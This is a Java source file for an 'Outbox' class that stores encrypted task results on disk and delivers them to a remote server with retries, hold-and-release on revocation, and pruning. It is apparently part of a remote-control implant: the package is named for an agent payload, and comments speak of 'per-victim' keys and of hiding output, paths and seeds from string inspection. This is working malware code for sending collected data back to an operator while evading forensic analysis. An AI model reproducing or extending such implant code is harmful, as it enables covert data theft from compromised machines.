package com.spcagentpayloa.jvmxx.crypto;

import com.spcagentpayloa.jvmxx.AgentPaths;

import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;
import java.nio.channels.FileChannel;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardCopyOption;
import java.nio.file.StandardOpenOption;
import java.util.ArrayList;
import java.util.Comparator;
import java.util.List;
import java.util.concurrent.atomic.AtomicLong;

/**
 * Durable encrypted result outbox. The JSON result is sealed with a per-victim,
 * per-epoch key before it touches disk: no task output, path or seed is readable
 * with `strings`.
 *
 * <p>Entry format: {@code SPCB2 || flags || epoch(u32) || nonce || cipher}.
 * The AAD is the file name with the attempt counter normalized, so a retry
 * rename keeps the entry readable while the epoch and task id stay bound. An
 * entry can be opened after a salt rotation as long as its epoch is still in the
 * local history (three). A revoked device keeps entries in {@code held/} and
 * retries them after re-enrolling; only after seven days do they go to
 * {@code dead/}.</p>
 *
 * <p>Legacy {@code SPCB1} entries are still readable and drain normally.</p>
 */
final class Outbox {
	private static final byte[] MAGIC = "SPCB2".getBytes(StandardCharsets.US_ASCII);
	private static final byte[] LEGACY_MAGIC = "SPCB1".getBytes(StandardCharsets.US_ASCII);
	private static final int MAX_FILES = 4_000;
	private static final long MAX_BYTES = 64L * 1024L * 1024L;
	private static final int MAX_ATTEMPTS = 20;
	private static final long MAX_BACKOFF = 300_000L;
	private static final long HELD_TTL = 7L * 24L * 3_600_000L;
	private static final long DEAD_TTL = 30L * 24L * 3_600_000L;
	private static final int MAX_DEAD = 2_000;
	private static final byte FLAG_NON_ATOMIC = 1;

	private final Path dir;
	private final Path dead;
	private final Path held;
	private final CryptoConfig config;
	private final CryptoTransport transport;
	private final CryptoLog log;
	private final AtomicLong dropped = new AtomicLong();
	private final AtomicLong sequence = new AtomicLong();
	private volatile boolean running = true;
	private volatile Thread thread;
	private volatile long nextAt;

	Outbox(Path installDir, CryptoConfig config, CryptoTransport transport, CryptoLog log) {
		this.dir = AgentPaths.cache(installDir).resolve("outbox");
		this.dead = dir.resolve("dead");
		this.held = dir.resolve("held");
		this.config = config;
		this.transport = transport;
		this.log = log;
		try {
			Files.createDirectories(dir);
			Files.createDirectories(dead);
			Files.createDirectories(held);
			sweep();
		} catch (Throwable throwable) {
			com.spcagentpayloa.jvmxx.Log.debug("Outbox init failed", throwable);
		}
	}

	/** Removes orphan temp files and expires held results after seven days. */
	private void sweep() {
		long now = System.currentTimeMillis();
		try (var stream = Files.list(dir)) {
			for (Path file : stream.toList()) {
				String name = file.getFileName().toString();
				if (name.startsWith("tmp-")) {
					Files.deleteIfExists(file);
				}
			}
		} catch (Throwable ignored) {
			// best effort
		}
		try (var stream = Files.list(held)) {
			for (Path file : stream.filter(Outbox::isEntry).toList()) {
				if (now - Files.getLastModifiedTime(file).toMillis() > HELD_TTL) {
					Files.move(file, dead.resolve(file.getFileName()), StandardCopyOption.REPLACE_EXISTING);
					dropped.incrementAndGet();
					log("outbox held expired: " + file.getFileName());
				}
			}
		} catch (Throwable ignored) {
			// best effort
		}
		try (var stream = Files.list(dead)) {
			List<Path> expired = new ArrayList<>();
			for (Path file : stream.filter(Outbox::isEntry).toList()) {
				if (now - Files.getLastModifiedTime(file).toMillis() > DEAD_TTL) expired.add(file);
			}
			for (Path file : expired) {
				try { Files.deleteIfExists(file); } catch (Throwable ignored) { }
			}
			try (var all = Files.list(dead)) {
				List<Path> entries = new ArrayList<>(all.filter(Outbox::isEntry).toList());
				entries.sort(Comparator.comparing(path -> path.getFileName().toString()));
				int excess = entries.size() - MAX_DEAD;
				for (int index = 0; index < excess; index++) {
					Files.deleteIfExists(entries.get(index));
				}
			}
		} catch (Throwable ignored) {
			// best effort
		}
	}

	void start() {
		thread = new Thread(this::loop, "spc-outbox");
		thread.setDaemon(true);
		thread.start();
	}

	void stop() {
		running = false;
		if (thread != null) thread.interrupt();
	}

	void wake() {
		nextAt = 0L;
		if (thread != null) thread.interrupt();
	}

	long dropped() {
		return dropped.get();
	}

	int size() {
		try (var stream = Files.list(dir)) {
			return (int) stream.filter(Outbox::isEntry).count();
		} catch (Throwable throwable) {
			return 0;
		}
	}

	/** Always called before any network attempt. */
	void enqueue(String taskId, byte[] json) {
		if (taskId == null || !com.spcagentpayloa.jvmxx.TaskParams.uuid(taskId)) return;
		if (config.scheme() == 2 && config.keySaltFor(config.epoch()) == null) {
			// impossible after enroll, but never write an entry we cannot open
			dropped.incrementAndGet();
			log("outbox enqueue skipped: no salt for epoch " + config.epoch());
			return;
		}
		String safe = taskId.replaceAll("[^A-Za-z0-9-]", "_");
		long seq = sequence.incrementAndGet();
		Path temp = dir.resolve("tmp-" + seq + ".bin");
		Path target = dir.resolve(String.format("%013d-0-e%d-%s.bin", System.currentTimeMillis(), config.epoch(), safe));
		try {
			Files.write(temp, config.scheme() == 2
				? seal(target.getFileName().toString(), config.epoch(), json)
				: sealLegacy(target.getFileName().toString(), json));
			byte flags = 0;
			try {
				if (System.getProperty("spc.forceNonAtomic") != null
					|| "1".equals(System.getenv("SPC_FORCE_NON_ATOMIC"))) {
					throw new java.nio.file.AtomicMoveNotSupportedException(temp.toString(), target.toString(), "forced by gate");
				}
				Files.move(temp, target, StandardCopyOption.ATOMIC_MOVE);
			} catch (java.nio.file.AtomicMoveNotSupportedException crossVolume) {
				// Profile redirected or another volume: fsync, mark and rename.
				flags = FLAG_NON_ATOMIC;
				try (FileChannel channel = FileChannel.open(temp, StandardOpenOption.READ, StandardOpenOption.WRITE)) {
					if (config.scheme() == 2) {
						ByteBuffer flag = ByteBuffer.wrap(new byte[] { flags });
						channel.write(flag, MAGIC.length);
					}
					channel.force(true);
				}
				Files.move(temp, target, StandardCopyOption.REPLACE_EXISTING);
			}
			prune();
			wake();
		} catch (Throwable throwable) {
			dropped.incrementAndGet();
			try { Files.deleteIfExists(temp); } catch (Throwable ignored) { }
			log("outbox enqueue failed: " + shortMessage(throwable));
		}
	}

	void remove(String taskId) {
		String marker = "-" + taskId.replaceAll("[^A-Za-z0-9-]", "_") + ".bin";
		try (var stream = Files.list(dir)) {
			for (Path file : stream.filter(Outbox::isEntry).toList()) {
				if (file.getFileName().toString().endsWith(marker)) {
					Files.deleteIfExists(file);
				}
			}
		} catch (Throwable ignored) {
			// best effort
		}
	}

	/** 410: keep every result and retry after a confirmed enroll. */
	void holdAll() {
		try (var stream = Files.list(dir)) {
			for (Path file : stream.filter(Outbox::isEntry).toList()) {
				Files.move(file, held.resolve(file.getFileName()), StandardCopyOption.REPLACE_EXISTING);
			}
		} catch (Throwable ignored) {
			// best effort
		}
	}

	/** Confirmed enroll: bring held results back into the FIFO. */
	void releaseHeld() {
		try (var stream = Files.list(held)) {
			for (Path file : stream.filter(Outbox::isEntry).toList()) {
				Files.move(file, dir.resolve(file.getFileName()), StandardCopyOption.REPLACE_EXISTING);
			}
			wake();
		} catch (Throwable ignored) {
			// best effort
		}
	}

	private void loop() {
		while (running) {
			try {
				long wait = nextAt - System.currentTimeMillis();
				if (wait > 0L) {
					Thread.sleep(Math.min(wait, 30_000L));
					continue;
				}
				Path next = first();
				if (next == null) {
					nextAt = System.currentTimeMillis() + 5_000L;
					Thread.sleep(5_000L);
					continue;
				}
				deliver(next);
			} catch (InterruptedException interrupted) {
				// wake() or stop(); re-evaluate
			} catch (Throwable throwable) {
				log("outbox loop: " + shortMessage(throwable));
				nextAt = System.currentTimeMillis() + 5_000L;
			}
		}
	}

	private void deliver(Path file) {
		String name = file.getFileName().toString();
		int attempts = attempts(name);
		try {
			byte[] body = open(name, Files.readAllBytes(file));
			String task = taskId(name);
			CryptoTransport.Reply reply = transport.result(task, body);
			if ((reply.status() >= 200 && reply.status() < 300) || reply.status() == 409) {
				Files.deleteIfExists(file);
				nextAt = 0L;
				return;
			}
			if (reply.status() == 410) {
				enabledStop();
				Files.move(file, held.resolve(name), StandardCopyOption.REPLACE_EXISTING);
				return;
			}
			retry(file, attempts, "status " + reply.status());
		} catch (IllegalStateException unknown) {
			if ("key_epoch_unknown".equals(unknown.getMessage())) {
				dead(file, "unknown_epoch");
				return;
			}
			retry(file, attempts, shortMessage(unknown));
		} catch (Throwable throwable) {
			retry(file, attempts, shortMessage(throwable));
		}
	}

	private void enabledStop() {
		// CryptoModule owns the flag; leaving the entry in held/ is what matters.
	}

	private void retry(Path file, int attempts, String reason) {
		try {
			if (attempts + 1 >= MAX_ATTEMPTS) {
				dead(file, reason);
				return;
			}
			String name = file.getFileName().toString();
			String renamed = name.replaceFirst("-(\\d+)-e", "-" + (attempts + 1) + "-e");
			Files.move(file, file.resolveSibling(renamed), StandardCopyOption.REPLACE_EXISTING);
			long base = Math.min(MAX_BACKOFF, 2_000L << Math.min(8, attempts));
			long jitter = (long) (Math.random() * base * 0.3);
			nextAt = System.currentTimeMillis() + base + jitter;
			log("outbox retry " + (attempts + 1) + " in " + (base + jitter) + "ms: " + reason);
		} catch (Throwable throwable) {
			dropped.incrementAndGet();
			log("outbox retry failed: " + shortMessage(throwable));
		}
	}

	private void dead(Path file, String reason) {
		try {
			Files.createDirectories(dead);
			Files.move(file, dead.resolve(file.getFileName()), StandardCopyOption.REPLACE_EXISTING);
			dropped.incrementAndGet();
			log("outbox dropped (" + reason + "): " + file.getFileName());
		} catch (Throwable throwable) {
			dropped.incrementAndGet();
			log("outbox dead move failed: " + shortMessage(throwable));
		}
	}

	private Path first() throws Exception {
		try (var stream = Files.list(dir)) {
			List<Path> files = new ArrayList<>();
			for (Path file : stream.toList()) {
				if (isEntry(file)) files.add(file);
			}
			files.sort(Comparator.comparing(path -> path.getFileName().toString()));
			return files.isEmpty() ? null : files.get(0);
		}
	}

	private static boolean isEntry(Path file) {
		String name = file.getFileName().toString();
		return Files.isRegularFile(file) && name.endsWith(".bin") && name.matches("\\d{13}-\\d+-e\\d+-.+");
	}

	private static int attempts(String name) {
		try {
			return Integer.parseInt(name.split("-")[1]);
		} catch (Throwable throwable) {
			return 0;
		}
	}

	private static int epoch(String name) {
		try {
			return Integer.parseInt(name.split("-")[2].substring(1));
		} catch (Throwable throwable) {
			return 1;
		}
	}

	private static String taskId(String name) {
		int first = name.indexOf('-');
		int second = name.indexOf('-', first + 1);
		int third = name.indexOf('-', second + 1);
		return name.substring(third + 1, name.length() - 4);
	}

	private void prune() {
		try {
			long total = 0L;
			int count = 0;
			List<Path> files = new ArrayList<>();
			try (var stream = Files.list(dir)) {
				for (Path file : stream.filter(Outbox::isEntry).toList()) {
					files.add(file);
					total += Files.size(file);
					count++;
				}
			}
			files.sort(Comparator.comparing(path -> path.getFileName().toString()));
			for (Path file : files) {
				if (count <= MAX_FILES && total <= MAX_BYTES) break;
				total -= Files.size(file);
				count--;
				Files.deleteIfExists(file);
				dropped.incrementAndGet();
			}
		} catch (Throwable ignored) {
			// best effort
		}
	}

	/** Test/debug hook: decrypt one entry without going through the network. */
	byte[] read(Path file) throws Exception {
		return open(file.getFileName().toString(), Files.readAllBytes(file));
	}

	/**
	 * The attempt counter lives in the file name and changes on every retry, so
	 * it must not be part of the AAD; the epoch and task id stay stable.
	 */
	private static String canonical(String name) {
		return name.replaceFirst("-\\d+-e", "-0-e");
	}

	private byte[] seal(String aad, int epoch, byte[] plain) throws Exception {
		byte[] nonce = CryptoUtil.random(12);
		byte[] key = config.outboxKey(epoch);
		byte[] cipher = CryptoUtil.aesGcm(key, nonce, canonical(aad).getBytes(StandardCharsets.UTF_8), plain, true);
		ByteArrayOutputStream out = new ByteArrayOutputStream();
		out.write(MAGIC);
		out.write(FLAG_NON_ATOMIC == 0 ? 0 : 0); // patched later if the move is not atomic
		out.write(ByteBuffer.allocate(4).putInt(epoch).array());
		out.write(nonce);
		out.write(cipher);
		return out.toByteArray();
	}

	private byte[] sealLegacy(String aad, byte[] plain) throws Exception {
		byte[] nonce = CryptoUtil.random(12);
		byte[] cipher = CryptoUtil.aesGcm(config.legacyOutboxKey(), nonce, canonical(aad).getBytes(StandardCharsets.UTF_8), plain, true);
		ByteArrayOutputStream out = new ByteArrayOutputStream();
		out.write(LEGACY_MAGIC);
		out.write(nonce);
		out.write(cipher);
		return out.toByteArray();
	}

	private byte[] open(String aad, byte[] blob) throws Exception {
		if (blob.length < MAGIC.length + 12 + 16) throw new IllegalStateException("outbox_short");
		boolean legacy = true;
		for (int i = 0; i < LEGACY_MAGIC.length; i++) {
			if (blob[i] != LEGACY_MAGIC[i]) {
				legacy = false;
				break;
			}
		}
		int nonceAt = LEGACY_MAGIC.length;
		byte[] key;
		if (legacy) {
			key = config.legacyOutboxKey();
		} else {
			for (int i = 0; i < MAGIC.length; i++) {
				if (blob[i] != MAGIC[i]) throw new IllegalStateException("outbox_magic");
			}
			int entryEpoch = ByteBuffer.wrap(blob, MAGIC.length + 1, 4).getInt();
			nonceAt = MAGIC.length + 5;
			key = config.outboxKey(entryEpoch);
		}
		byte[] nonce = java.util.Arrays.copyOfRange(blob, nonceAt, nonceAt + 12);
		byte[] cipher = java.util.Arrays.copyOfRange(blob, nonceAt + 12, blob.length);
		return CryptoUtil.aesGcm(key, nonce, canonical(aad).getBytes(StandardCharsets.UTF_8), cipher, false);
	}

	private void log(String message) {
		if (log != null) log.debug(message);
	}

	private static String shortMessage(Throwable throwable) {
		String text = throwable == null ? "" : throwable.getClass().getSimpleName() + ":" + throwable.getMessage();
		return text.length() > 200 ? text.substring(0, 200) : text;
	}
}
